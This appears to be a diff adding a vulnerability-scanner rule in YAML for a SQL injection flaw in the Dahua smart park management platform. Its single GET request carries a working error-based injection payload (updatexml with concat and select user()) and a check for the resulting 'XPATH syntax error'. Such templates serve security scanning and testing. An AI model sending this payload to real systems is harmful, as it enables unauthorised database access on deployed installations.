@@ -1,0 +1,11 @@
+name: 大华智慧园区综合管理平台-searchJson-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D"
+    expression:
+      status: 500
+      body_all: ["XPATH syntax error"]
